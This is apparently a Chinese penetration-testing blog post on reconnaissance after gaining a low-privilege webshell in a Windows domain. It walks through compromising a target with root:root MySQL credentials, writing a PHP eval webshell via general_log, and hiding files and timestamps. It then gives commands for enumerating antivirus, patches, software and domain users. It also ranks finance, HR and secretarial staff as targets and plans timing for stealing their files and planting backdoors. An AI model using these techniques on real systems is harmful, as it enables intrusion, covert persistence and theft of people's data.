# 0x01 前情提要

在内网环境中，信息收集尤为重要。（通过多种协议）探测内网存活主机也属于信息收集的一部分。


案例如下：**非 root/administrator 下主动信息搜集**


此 webshell 这样获取的：
1、通过扫端口，发现某站 8980 端口存在 http 服务；
2、在此端口爆破目录，发现存在 phpStudy 探针文件，获取 web 目录的绝对路径； `D:/phpStudy4IIS/WWW`。在此探针文件下用 `root`:`root` 弱密码进行 MYSQL 检测，发现尝试成功；
3、另外此端口还有 phpMyAdmin 目录，用 `root`:`root` 登陆进去；
4、使用 `general_log` 方法对 mysql 写入一句话木马：
``` mysql
set global general_log='on' 
set global general_log_file='D:\\phpStudy4IIS\\WWW\\slow_log.php' #一定要使用 '\\'
select "<?php eval($_POST[angel])?>"
```
5、菜刀连 http://domain:8980/log.php angel
6、连上之后做一些基本的隐蔽目录、更改文件时间等隐蔽化操作。


当前权限为：
![title](https://leanote.com/api/file/getImage?fileId=5dd7a192ab64414b9f001855)


在得到一个 webshell 时，非 root/administrator 情况下对目标信息搜集至关重要，它会影响后期的渗透是否顺利，以及渗透方向。 


# 0x02 信息收集

## 1、获取内网 IP

![title](https://leanote.com/api/file/getImage?fileId=5dd7a3a8ab64414b9f001b0c)

注：有的目标主机会分配 2 个内网 IP ，如 10.x.x.x 与 192.168.x.x。

## 2、获取服务软件与杀软

![title](https://leanote.com/api/file/getImage?fileId=5dd7a73bab64414d9f001c0d)

![title](https://leanote.com/api/file/getImage?fileId=5dd7a6daab64414b9f001b4c)

得知部分服务软件，以及杀毒软件 360 全套，一般内网中为杀毒为集体一致。


查看杀软的四种方法：

一、 获取防病毒软件 Windows 命令行

```
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
```

![title](https://leanote.com/api/file/getImage?fileId=5e0576f2ab644136ef0018ad)

二、看服务：`net start` 命令

![title](https://leanote.com/api/file/getImage?fileId=5e0316e4ab644170cf0025e0)
![title](https://leanote.com/api/file/getImage?fileId=5e031749ab644170cf0025f2)

其中的`主动防御`就是 360。

三、看进程：`tasklist /svc`

![title](https://leanote.com/api/file/getImage?fileId=5e031806ab644172cb0026c5)
![title](https://leanote.com/api/file/getImage?fileId=5e03188cab644170cf002639)

其中的 `ZhuDongFangYu.exe` 就是360。

看上面两者合并。

四、看 `Program Files` 路径下的安装目录

就是看 `C:\Program Files (x86)` 和 `C:\Program Files` 这两个路径下的安装目录有没有杀软。

![title](https://leanote.com/api/file/getImage?fileId=5e0318edab644172cb0026e6)

## 3、搜集补丁更新频率，以及系统状况

![title](https://leanote.com/api/file/getImage?fileId=5dd7b172ab64414b9f001c12)
![title](https://leanote.com/api/file/getImage?fileId=5dd7a86bab64414b9f001b68)

如果目标机器上补丁过多，加上杀软齐全，就应该考虑放弃 exp 提权。
原因1：需要更多的时间消耗在对反病毒软件对抗。<br> 原因2：目标机补丁过多，需要消耗更多的时间。<br> 原因3：可能因为某些 exp 导致蓝屏从而丢失权限。<br>

此种情况下示例提权思路：如目标机器上安装了 mysql，并与内网其中一台建立大量连接。就可以考虑 mysql udf 提权。

单个补丁安装情况查询：
``` shell
systeminfo>snowming.txt&(for %i in (KB4519572  KB4287903 KB4287904) do @type snowming.txt|@find /i  "%i"|| @echo  no this padding: %i)&del /f /q /a snowming.txt
```

![title](https://leanote.com/api/file/getImage?fileId=5dd7ad4cab64414b9f001bbb)
注：以上需要在可写目录执行。需要临时生成 snowming.txt，以上补丁编号请根据环境来增、删。


## 4、搜集安装软件以及版本，路径等

``` shell
wmic product > insformation.txt
```
![title](https://leanote.com/api/file/getImage?fileId=5dd7b033ab64414b9f001c03)

``` shell
powershell "Get-WmiObject -class Win32_Product |Select-Object -Property name,version"
```


![title](https://leanote.com/api/file/getImage?fileId=5dd7b0f7ab64414d9f001cb3)

## 5、获取域组、用户


获取全部域用户：

``` shell
net user /domain
```
![title](https://leanote.com/api/file/getImage?fileId=5dd7b31fab64414d9f001ce1)

获取域分组：

``` shell
net group /domain
```
![title](https://leanote.com/api/file/getImage?fileId=5dd7b45aab64414d9f001cea)

在域组中，其中有几个组需要特别关注： 
1. IT组/研发组：他们掌握在大量的内网密码，数据库密码等。 
2. 秘书组：他们掌握着大量的目标机构的内部传达文件，为信息分析业务提供信息，在反馈给技术业务来确定渗透方向。 
3. Domain Admins 组：root/administrator 
4. 财务组：他们掌握着大量的资金往来与目标企业的规划发展，并且可以通过资金，来判断出目标组织的整体架构。
5. CXX 组，如ceo，cto，coo等。不同的目标组织名字不同，如部长，厂长，经理等。
6. HR 组：他们的电脑中有大量人事信息，商业秘密等。


以 Domain Admins 组为例，开始规划信息探测等级：


1. 【等级1】确定某部门具体人员数量；
2. 【等级2】确定该部门的英文用户名的具体信息，如姓名，联系方式，邮箱，职务等。以便确定下一步攻击方向；
3. 【等级3】分别探测`白天`/`夜间`内网中所存活机器并且对应IP地址；
4. 【等级4】对应人员的工作机内网IP，以及工作时间；
5. 【等级5】根据信息业务反馈，制定目标安全时间，以便拖拽指定人员文件，或登录目标机器；
6. 【等级6】制定目标机器后渗透与持续渗透的方式以及后门。

**探测等级1：**

```
net group "Domain Admins" /domain
```
![title](https://leanote.com/api/file/getImage?fileId=5dd7b6b7ab64414b9f001c58)

**探测等级2：**

``` shell
for /f %i in (1.txt) do net user %i /domain >>user.txt
```

注：`1.txt` 为上一步收集到的用户名：

![title](https://leanote.com/api/file/getImage?fileId=5dd7ba19ab64414b9f001c7f)

![title](https://leanote.com/api/file/getImage?fileId=5dd7ba82ab64414b9f001c82)


后面可以结合 `meterpreter` 获取反弹 shell、测试内网段在线主机、获取主机操作系统信息、获取端口服务开放情况等。

注：可以在不同的时段（白天/晚上）探测内网段在线主机。


# 0x03 总结


本文中探讨了非 root/administrator 用户下的主动信息搜集。



在 `iis appool\defaultappool` 的权限下，逐步获取了如下信息：

1. 该目标内网分配段
2. 安装的软件
3. 杀毒软件情况
4. 端口开放情况
5. 运行的服务
6. 补丁情况
7. 管理员上线操作时间段
8. 域用户详细信息（英文 user 对应的职务，姓名等）
9. 根据域内分组可以进一步确定攻击方向。如秘书组，如 hr 组等。

进一步提权可以结合运行的服务，如 mysql 提权。


-----------------------

参考资料：

1. [渗透的本质是信息搜集（第五十二课））.pdf](https://github.com/Micropoor/Micro8/blob/master/%E6%B8%97%E9%80%8F%E7%9A%84%E6%9C%AC%E8%B4%A8%E6%98%AF%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%EF%BC%88%E7%AC%AC%E4%BA%94%E5%8D%81%E4%BA%8C%E8%AF%BE%EF%BC%89%EF%BC%89.pdf)，Github，Micropoor，2019年2月18日 

